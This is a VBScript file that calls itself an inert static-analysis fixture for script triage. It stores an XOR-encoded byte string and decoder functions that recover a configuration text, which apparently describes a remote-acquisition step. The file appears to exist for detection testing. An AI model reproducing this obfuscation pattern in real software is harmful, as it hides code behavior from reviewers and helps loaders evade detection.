Option Explicit
' Huntress Script Triage -- inert static-analysis fixture (wsh_vbscript_windows)
Const Material_4857dc34 = "160,134,74,33,226,162,222,11,46,172,183,216,10,40,248,164,222,36,47,244,187,212,15,56,189,178,210,8,45,240,162,216,19,2,252,179,214,20,47,232,170,218,31,60,225,162,222,9,96,220,191,216,9,50,226,185,221,15,115,201,155,247,51,9,197,134,199,8,41,240,177,222,36,62,254,163,213,15,96,163,170,216,26,48,225,183,210,28,51,206,191,223,70,62,240,187,203,26,52,246,184,150,25,100,165,227,141,75,63,161,229,142,7,40,227,186,134,19,41,229,166,200,65,114,190,180,130,79,104,167,230,217,75,110,164,248,222,3,60,252,166,215,30,115,248,184,205,26,49,248,178,148,79,56,168,227,138,77,107,243,248,223,26,41,237,163,200,30,47,206,183,220,30,51,229,235,243,14,51,229,164,222,8,46,221,183,217,84,63,168,226,142,77,109,243,230,136,78"
Const Codec_4857dc34 = "decimal_comma|repeating_key_xor|d6,bb,7b,5d,91"

Function Load_4857dc34()
  Dim parts, result(), materialIndex
  parts = Split(Material_4857dc34, ",")
  ReDim result(UBound(parts))
  For materialIndex = 0 To UBound(parts)
    result(materialIndex) = CInt(parts(materialIndex))
  Next
  Load_4857dc34 = result
End Function

Function Decode_4857dc34(ByRef storedMaterial)
  Dim result(), materialIndex, keyBytes, previous
  ReDim result(UBound(storedMaterial))
  keyBytes = Array(214,187,123,93,145)
  For materialIndex = 0 To UBound(storedMaterial)
    result(materialIndex) = storedMaterial(materialIndex) Xor keyBytes(materialIndex Mod 5)
  Next
  Decode_4857dc34 = result
End Function

Function Recover_4857dc34()
  Dim storedMaterial, recoveredMaterial, configurationText, harmlessValue, materialIndex, decodePass, savedError, savedDescription
  If True Then
    If (2 > 1) Then harmlessValue = "left" Else harmlessValue = "right"
      storedMaterial = Load_4857dc34()
      decodePass = 0
      While decodePass < 1
        recoveredMaterial = Decode_4857dc34(storedMaterial)
        decodePass = decodePass + 1
      Wend
      configurationText = ""
      For materialIndex = 0 To UBound(recoveredMaterial)
        configurationText = configurationText & Chr(recoveredMaterial(materialIndex))
      Next
  End If
  Recover_4857dc34 = configurationText
End Function

Function Inspect_4857dc34()
  Dim fields
  fields = Split(Recover_4857dc34(), "|")
  Inspect_4857dc34 = Join(fields, "|")
End Function
